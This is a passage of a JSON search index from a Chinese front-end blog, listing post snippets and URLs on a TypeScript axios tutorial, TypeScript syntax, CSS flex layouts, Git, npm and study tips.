单元测试"],"lvl2":"摘要","objectID":"c87903a64c5b8c8ffa4f0ec66c88b909","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/04.%E8%AF%B7%E6%B1%82%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"辅助模块单元测试 准备工作 通常我们会优先为一个库的辅助方法编写测试，我们会优先为 ts-axios 库的 helpers 目录下的模块编写测试。我们在 test 目录下创建一个 helpers 目录，创","lvl0":"辅助模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"81d257e668982fca3bc1beddb50dd125","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/03.%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"错误信息增强 需求分析 上一节课我们已经捕获了几类 AJAX 的错误，但是对于错误信息提供的非常有限，我们希望对外提供的信息不仅仅包含错误文本信息，还包括","lvl0":"错误信息增强","lvl1":["《TypeScript 从零实现 axios》","ts-axios 异常情况处理"],"lvl2":"摘要","objectID":"eee5e8b77eb210b213d836947eb25e99","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/05.ts-axios-%E5%BC%82%E5%B8%B8%E6%83%85%E5%86%B5%E5%A4%84%E7%90%86/02.%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E5%A2%9E%E5%BC%BA/"},{"content":"错误处理 需求分析 在上一章节，我们实现了 ts-axios 的基础功能，但目前为止我们都是处理了正常接收请求的逻辑，并没有考虑到任何错误情况的处理，这对于一个程","lvl0":"错误处理","lvl1":["《TypeScript 从零实现 axios》","ts-axios 异常情况处理"],"lvl2":"摘要","objectID":"4816ecd99ece3c0ea6fc341bddbf914e","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/05.ts-axios-%E5%BC%82%E5%B8%B8%E6%83%85%E5%86%B5%E5%A4%84%E7%90%86/01.%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"},{"content":"需求分析 接下来的章节，我们会使用 TypeScript 来重构 axios，重构之前，我们需要简单地做一些需求分析，看一下我们这次重构需要支持哪些 feature。 Features","lvl0":"需求分析","lvl1":["《TypeScript 从零实现 axios》","ts-axios 项目初始化"],"lvl2":"摘要","objectID":"39bb88cebd535ab9e714bbe7bddfb552","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/03.ts-axios-%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%8C%96/01.%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/"},{"content":"静态方法扩展 需求分析 官方 axios 库实现了 axios.all、axios.spread 等方法，它们的用法如下： 1 2 3 4 5 6 7 8 9 10 11 12 function getUserAccount() { return axios.get(\u0026#39;/user/12345\u0026#39;); } function","lvl0":"静态方法扩展","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"9c41ad7df4165a22156dce1c1a7210eb","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/08.%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E6%89%A9%E5%B1%95/"},{"content":"","lvl0":"《TypeScript 从零实现 axios》","lvl1":null,"lvl2":"摘要","objectID":"df46c3bf03c2c64075ec4cf4ea005e20","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/30.typescript-%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/"},{"content":"函数 函数是 JavaScript 应用程序的基础，它帮助你实现抽象层，模拟类，信息隐藏和模块。在 TypeScript 里，虽然已经支持类，命名空间和模块，但函数仍然是主要的定义行为的","lvl0":"函数","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"8ca4a26355ccba265a89e621c5335102","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/05.%E5%87%BD%E6%95%B0/"},{"content":"变量声明 let 和 const 是 JavaScript 里相对较新的变量声明方式。let 在很多方面与 var 是相似的，但是可以帮助大家避免在 JavaScript 里常见一些问题。const 是对 let 的一个增强","lvl0":"变量声明","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"14687582cdd0292cdea252209ebba6d6","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/02.%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E/"},{"content":"基础类型 TypeScript 支持与 JavaScript 几乎相同的数据类型，此外还提供了实用的枚举类型方便我们使用。 布尔值 最基本的数据类型就是简单的 true/false 值，在JavaScript 和","lvl0":"基础类型","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"672987839a28edc5d0e4b0c3e2f28dff","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/01.%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/"},{"content":"接口 TypeScript 的核心原则之一是对值所具有的结构进行类型检查。它有时被称做“鸭式辨型法”或“结构性子类型化”。 在 TypeScript 里，接口的作用就是为这些类型命名和为","lvl0":"接口","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"379eb49ecf47d1b9ceb187c1d2b6995f","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/03.%E6%8E%A5%E5%8F%A3/"},{"content":"泛型 软件工程中，我们不仅要创建定义良好且一致的 API，同时也要考虑可重用性。 组件不仅能够支持当前的数据类型，同时也能支持未来的数据类型，这在","lvl0":"泛型","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"0804f0954496e4c1cdc86cf604eec600","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/06.%E6%B3%9B%E5%9E%8B/"},{"content":"类 对于传统的 JavaScript 程序我们会使用函数和基于原型的继承来创建可重用的组件，但对于熟悉使用面向对象方式的程序员使用这些语法就有些棘手，因为他们用的是","lvl0":"类","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"593b6057fd1e609aa3a34af39eee5933","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/04.%E7%B1%BB/"},{"content":"类型推断 这节介绍 TypeScript 里的类型推断。即，类型是在哪里如何被推断的。 基础 TypeScript 里，在有些没有明确指出类型的地方，类型推断会帮助提供类型。如下面的例子：","lvl0":"类型推断","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"85b030b272f511ee0212254c3e9faa6f","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/07.%E7%B1%BB%E5%9E%8B%E6%8E%A8%E6%96%AD/"},{"content":"高级类型 交叉类型 交叉类型是将多个类型合并为一个类型。 这让我们可以把现有的多种类型叠加到一起成为一种类型，它包含了所需的所有类型的特性。 例如，","lvl0":"高级类型","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"ae5162b4dc000480606ef0c69e5c41da","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/08.%E9%AB%98%E7%BA%A7%E7%B1%BB%E5%9E%8B/"},{"content":"安装 TypeScript 命令行运行如下命令，全局安装 TypeScript： 1 npm install -g typescript 安装完成后，在控制台运行如下命令，检查安装是否成功(3.x)： 1 tsc -V","lvl0":"安装 TypeScript","lvl1":["《TypeScript 从零实现 axios》","初识 TypeScript"],"lvl2":"摘要","objectID":"a9774c7dce9470c246198c1aa14cf25b","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/01.%E5%88%9D%E8%AF%86-typescript/02.%E5%AE%89%E8%A3%85-typescript/"},{"content":"简介 TypeScript 作为 JavaScript 语言的超集，它为 JavaScript 添加了可选择的类型标注，大大增强了代码的可读性和可维护性。同时，它提供最新和不断发展的 JavaScript 特性，能让我们建立更健","lvl0":"简介","lvl1":["《TypeScript 从零实现 axios》","初识 TypeScript"],"lvl2":"摘要","objectID":"4fa5049e2149a55099f6b475e569bf7e","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/01.%E5%88%9D%E8%AF%86-typescript/01.%E7%AE%80%E4%BB%8B/"},{"content":"编写第一个 TypeScript 程序 在编辑器，将下面的代码输入到 greeter.ts 文件里： 1 2 3 4 5 6 7 function greeter (person) { return \u0026#39;Hello, \u0026#39; + person } let user = \u0026#39;Yee\u0026#39; console.log(greeter(user)) 编译代码 我们使用了 .ts 扩展名，但是这段代码仅","lvl0":"编写第一个 TypeScript 程序","lvl1":["《TypeScript 从零实现 axios》","初识 TypeScript"],"lvl2":"摘要","objectID":"048bde90f89847438ebabf78d344a850","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/01.%E5%88%9D%E8%AF%86-typescript/03.%E7%BC%96%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AA-typescript-%E7%A8%8B%E5%BA%8F/"},{"content":"判断是否为移动端浏览器 1 2 3 4 5 6 const flag = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if(flag){ // 移动端 } else { // PC端 }","lvl0":"判断是否为移动端浏览器","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"58add2694eca00bf4876d81c0d9e0648","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/60.%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B5%8F%E8%A7%88%E5%99%A8/"},{"content":"提高学习效率的策略 推荐一本关于学习方法的书《认知天性》，里面有讲到有一些简单实用的学习策略，能让大家学的更好、记得更牢，而且这些策略人人可用","lvl0":"提高学习效率的策略","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"b5575702d800e3b7dd194ac008df3106","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/02.%E6%8F%90%E9%AB%98%E5%AD%A6%E4%B9%A0%E6%95%88%E7%8E%87%E7%9A%84%E7%AD%96%E7%95%A5/"},{"content":"处理问题的思路 工作中遇到问题？ 遇到问题卡住了，可以先休息一会儿，调整一下状态，喝杯水走走放松放松，然后想想有没有遗漏的地方，或者其他的解决方","lvl0":"处理问题的思路","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"94e643cc14c0a61156921c4cb677e04b","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/05.%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%B7%AF/"},{"content":"自律小建议 培养专注 练习冥想、瑜伽等 排除外界干扰 手机调到勿扰，在图书馆学习等 规定学习时间 番茄时间管理——使用番茄时间管理法，选择一个待完成的任","lvl0":"自律小建议","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"46f23b4be5da06c02f559ebefdc5f679","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/04.%E8%87%AA%E5%BE%8B%E5%B0%8F%E5%BB%BA%E8%AE%AE/"},{"content":"提高记忆的技巧 多个感官并用 记忆时调用一切感官。没人的话可以大声阅读，有人的话可以默念，轻微摇晃手指等，有助于保持专注。 重复记忆 每天留出半个到","lvl0":"提高记忆的技巧","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"dc3a900c06ca3959513f9a48e43edeab","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/03.%E6%8F%90%E9%AB%98%E8%AE%B0%E5%BF%86%E7%9A%84%E6%8A%80%E5%B7%A7/"},{"content":"GitHub + jsDelivr + TinyPNG+ PicGo 打造稳定快速、高效免费图床 前言 Q：为什么要使用图床呢？什么是图床？ A：写博客文章时，图片的上传和存放是一个问题，有的朋友可能会把","lvl0":"GitHub + jsDelivr + TinyPNG+ PicGo 打造稳定快速、高效免费图床","lvl1":["技术","博客搭建"],"lvl2":"摘要","objectID":"5398007933eef0e2e13109a25c4bbe2c","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/04.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/03.github-+-jsdelivr-+-tinypng+-picgo-%E6%89%93%E9%80%A0%E7%A8%B3%E5%AE%9A%E5%BF%AB%E9%80%9F%E9%AB%98%E6%95%88%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/"},{"content":"GitHub Actions 定时运行代码：每天定时百度链接推送 博客上线已经有些日子了，却发现百度迟迟没有收录我的博客页面，在百度推送工具当中除了有自动推送的代码嵌入","lvl0":"GitHub Actions 定时运行代码：每天定时百度链接推送","lvl1":["技术","GitHub技巧"],"lvl2":"摘要","objectID":"5b2a8cd4ea4793563f59c4f8699c0f7c","tags":["github","博客"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/02.github%E6%8A%80%E5%B7%A7/03.github-actions-%E5%AE%9A%E6%97%B6%E8%BF%90%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%AF%8F%E5%A4%A9%E5%AE%9A%E6%97%B6%E7%99%BE%E5%BA%A6%E9%93%BE%E6%8E%A5%E6%8E%A8%E9%80%81/"},{"content":"GitHub Actions 实现自动部署静态博客 前言 我使用vuepress搭建了一个静态博客，挂在了Github pages和Coding pages上面。 coding pages","lvl0":"GitHub Actions 实现自动部署静态博客","lvl1":["技术","GitHub技巧"],"lvl2":"摘要","objectID":"3f73d1a5ff7573775378065b33488b59","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/02.github%E6%8A%80%E5%B7%A7/02.github-actions-%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/"},{"content":"nodejs递归读取所有文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var fs = require(\u0026#39;fs\u0026#39;); var path = require(\u0026#39;path\u0026#39;); function readFileList(dir, filesList = []) { const files = fs.readdirSync(dir); console.log(files); files.forEach((item, index) =\u0026gt; { var fullPath = path.join(dir, item); const stat = fs.statSync(fullPath); if (stat.isDirectory()) {","lvl0":"nodejs递归读取所有文件","lvl1":["技术","Nodejs"],"lvl2":"摘要","objectID":"f85f5f6374008da1c3e0f652133fa831","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/03.nodejs/01.nodejs%E9%80%92%E5%BD%92%E8%AF%BB%E5%8F%96%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6/"},{"content":"CSS3之animation动画 可用F12开发者工具查看元素及样式，可打开codepen在线编辑代码。 ::: demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16","lvl0":"CSS3之animation动画","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"dc3d4a7eeb29625ef1540010812617fa","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/08.css3%E4%B9%8Banimation%E5%8A%A8%E7%94%BB/"},{"content":"CSS3之transition过渡 html结构 1 2 3 4 5 \u0026lt;div class=\u0026#34;box1\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;div1\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;div2\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;div3\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 先给元素设置transition过渡，指定样式和时间，这里设置al","lvl0":"CSS3之transition过渡","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"510a31bbcd836ebc5bd3e62ff7c0b6a5","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/07.css3%E4%B9%8Btransition%E8%BF%87%E6%B8%A1/"},{"content":"ES6面向对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 //面向对象封装 class","lvl0":"ES6面向对象","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"9cf6e4e5d41583e94437d401789b2df9","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/04.es6%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"content":"flex布局案例-圣杯布局 可用F12开发者工具查看元素及样式，可打开codepen在线编辑代码。 ::: demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19","lvl0":"flex布局案例-圣杯布局","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"a91a57e98ef5808925a1be7c6f3b30fe","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/04.flex%E5%B8%83%E5%B1%80%E6%A1%88%E4%BE%8B-%E5%9C%A3%E6%9D%AF%E5%B8%83%E5%B1%80/"},{"content":"flex布局案例-基础 可用F12开发者工具查看元素及样式，可打开codepen在线编辑代码。 ::: demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21","lvl0":"flex布局案例-基础","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"7533359ae9bd1995c55934e2fb36bc96","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/02.flex%E5%B8%83%E5%B1%80%E6%A1%88%E4%BE%8B-%E5%9F%BA%E7%A1%80/"},{"content":"flex布局案例-网格布局 可用F12开发者工具查看元素及样式，可打开codepen在线编辑代码。 ::: demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19","lvl0":"flex布局案例-网格布局","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"96d3ec2b8b0d851799e26d7cee8086a2","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/05.flex%E5%B8%83%E5%B1%80%E6%A1%88%E4%BE%8B-%E7%BD%91%E6%A0%BC%E5%B8%83%E5%B1%80/"},{"content":"flex布局案例-输入框布局 可用F12开发者工具查看元素及样式，可打开codepen在线编辑代码。 ::: demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18","lvl0":"flex布局案例-输入框布局","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"80ff167b9b2c586020a041c80aeb93b7","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/06.flex%E5%B8%83%E5%B1%80%E6%A1%88%E4%BE%8B-%E8%BE%93%E5%85%A5%E6%A1%86%E5%B8%83%E5%B1%80/"},{"content":"flex布局案例-骰子 可用F12开发者工具查看元素及样式，可打开codepen在线编辑代码。 ::: demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21","lvl0":"flex布局案例-骰子","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"e66c995ad64300ea8648a8e2dfae076c","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/03.flex%E5%B8%83%E5%B1%80%E6%A1%88%E4%BE%8B-%E9%AA%B0%E5%AD%90/"},{"content":"flex布局语法 一、flex 布局是什么？ Flex是 Flexible Box 的缩写，意为\u0026quot;弹性布局\u0026rdquo;，用来为盒状模型提供最大的灵活性。 任何一","lvl0":"flex布局语法","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"3f450ff6aaaae1bc9b979f1e459dc4e1","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/01.flex%E5%B8%83%E5%B1%80%E8%AF%AD%E6%B3%95/"},{"content":"GitHub高级搜索技巧 in:name \u0026lt;关键字\u0026gt; 仓库名称带关键字查询 in:description \u0026lt;关键字\u0026gt; 仓库描述带关键字查询 in:readme \u0026lt;关键字\u0026gt; RE","lvl0":"GitHub高级搜索技巧","lvl1":["技术","GitHub技巧"],"lvl2":"摘要","objectID":"0dd63f15dc12c3bf2f64fd2d2e9b1d8c","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/02.github%E6%8A%80%E5%B7%A7/01.github%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/"},{"content":"Git使用手册 安装 官网下载：https://git-scm.com/downloads 下载完成后使用默认进行安装。 安装完成后，在开始菜单里找","lvl0":"Git使用手册","lvl1":["技术","技术文档"],"lvl2":"摘要","objectID":"637edb9f3036e6fa6ea335e4febdee15","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/01.%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/01.git%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"},{"content":"Markdown使用教程 一、Markdown 简介 Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。 应用 当前许多网站都广泛使","lvl0":"Markdown使用教程","lvl1":["技术","技术文档"],"lvl2":"摘要","objectID":"9fc16129a4e31356c49295c2de4e238d","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/01.%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/02.markdown%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"},{"content":"new命令原理 使用new命令时，它后面的函数依次执行下面的步骤： 创建一个空对象，作为将要返回的实例对象。 将这个空对象的原型，指向构造函数的p","lvl0":"new命令原理","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"8b0c62712b2400d46343a5e289223d2c","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/02.new%E5%91%BD%E4%BB%A4%E5%8E%9F%E7%90%86/"},{"content":"npm常用命令 简介 npm是跟随node一起安装的包（模块）管理器。常见的使用场景有以下几种： 允许用户从npm服务器下载别人编写的第三方包到本","lvl0":"npm常用命令","lvl1":["技术","技术文档"],"lvl2":"摘要","objectID":"f7f600dbf181433b16120e84a66bf8f2","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/01.%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/03.npm%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"content":"yaml语言教程 简介 YAML 是 \u0026ldquo;YAML Ain\u0026rsquo;t a Markup Language\u0026rdquo;（YAML 不是一种标记语言）的递归缩写。在开发的这种语言时，YAML 的意思其实","lvl0":"yaml语言教程","lvl1":["技术","技术文档"],"lvl2":"摘要","objectID":"e1114466d86bf3e521688f42123cfdcf","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/01.%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/15.yaml%E8%AF%AD%E8%A8%80%E6%95%99%E7%A8%8B/"},{"content":"使用Gitalk实现静态博客无后台评论系统 前言 Gitalk，一个基于 Github Issue 和 Preact 开发的评论插件。 下面我们来用它在vuepress搭建的博客中搭建","lvl0":"使用Gitalk实现静态博客无后台评论系统","lvl1":["技术","博客搭建"],"lvl2":"摘要","objectID":"b710bca641f9e423419acb6a48db9282","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/04.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/02.%E4%BD%BF%E7%94%A8gitalk%E5%AE%9E%E7%8E%B0%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E6%97%A0%E5%90%8E%E5%8F%B0%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/"},{"content":"📚Blog 这是一个兼具博客文章、知识管理、文档查找的个人网站，主要内容是Web前端技术。如果你喜欢这个博客\u0026amp;主题欢迎到GitHub点","lvl0":"关于","lvl1":null,"lvl2":"摘要","objectID":"bdf0ef2959dc6bda9164abd4b12ae2f9","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/05.%E5%85%B3%E4%BA%8E/01.%E5%85%B3%E4%BA%8E/"},{"content":"::: cardList 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68","lvl0":"友情链接","lvl1":null,"lvl2":"摘要","objectID":"d9cf75c002effb53dc0d3160ac679f64","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/99.%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/"},{"content":"多种数组去重性能对比 测试模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // 创建一个 1 ~ 10w 的数组，Array.from为ES6语法 let arr1 = Array.from(new 